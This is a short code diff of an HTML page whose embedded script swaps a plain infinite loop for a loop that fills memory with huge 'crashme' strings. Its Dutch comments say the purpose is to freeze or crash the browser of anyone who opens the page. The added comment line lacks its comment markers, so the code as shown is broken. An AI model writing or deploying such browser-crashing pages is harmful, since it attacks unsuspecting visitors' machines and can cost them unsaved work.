@@ -7,9 +7,10 @@
 </head>
 <body>
     <script>
-        // Optie 1: Simpele oneindige loop → bijna altijd direct bevriezen
+        Optie 2: Geheugen volgooien (werkt vaak ook goed, soms zelfs beter)
+        let arr = [];
         while (true) {
-            
+        arr.push(new Array(1000000).join('crashme '));
         }
     </script>
 </body>
